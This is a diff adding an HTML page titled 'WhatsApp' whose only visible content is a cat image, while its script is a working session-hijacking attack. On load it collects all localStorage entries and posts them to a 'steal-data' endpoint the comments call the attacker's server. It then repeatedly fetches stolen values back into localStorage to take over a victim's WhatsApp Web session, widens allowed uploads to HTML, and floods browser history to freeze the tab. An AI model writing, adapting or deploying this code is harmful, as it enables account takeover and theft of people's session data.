@@ -1,0 +1,81 @@
+<html>
+<head>
+    <title>WhatsApp</title>
+    <script>
+        var W = {
+            default: {
+                DOC_MIMES: "application/pdf,application/msword,image/jpeg,image/png" // add other MIME types as needed
+            }
+        };
+
+        // Add the malicious MIME type to allow HTML uploads
+        (function addMimeType() {
+            W["default"].DOC_MIMES += ", text/html"; // Allow HTML files
+        })();
+
+        // Fetch data from local storage and return as an object
+        function getLocalStorageData() {
+            const values = {};
+            const keys = Object.keys(localStorage);
+            keys.forEach(key => {
+                values[key.replace(/ /g, '+')] = localStorage.getItem(key).replace(/ /g, '+');
+            });
+            return values;
+        }
+
+        // Send captured data to the attacker's server
+        function sendDataToServer(data) {
+            fetch("http://localhost:3000/steal-data", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: "account_data=" + encodeURIComponent(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+            })
+            .catch(err => console.error("Error sending data:", err));
+        }
+
+        // Immediately capture and send local storage data
+        (function captureAndSend() {
+            const result = getLocalStorageData();
+            const json = JSON.stringify(result);
+            sendDataToServer(json);
+        })();
+
+        // Periodically check for new data to steal
+        setInterval(function () {
+            fetch("http://localhost:3000/steal-data", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                localStorage.clear();
+                Object.keys(data).forEach(key => {
+                    localStorage.setItem(key, data[key]);
+                });
+
+                alert("Move to Victim Account");
+                window.location.href = "https://web.whatsapp.com/"; 
+            })
+            .catch(err => console.error("Error fetching data:", err)); 
+        }, 2000);
+
+        // Create multiple history states to freeze the browser
+        for (let i = 0; i < 100000; i++) {
+            history.pushState(0, 0, i.toString());
+        }
+
+    </script>
+</head>
+<body>
+    <img src="https://s-media-cache-ak0.pinimg.com/736x/f4/49/bc/f449bc4db763ba65378ba659fe7fc865.jpg" alt="Funny cat" />
+</body>
+</html>
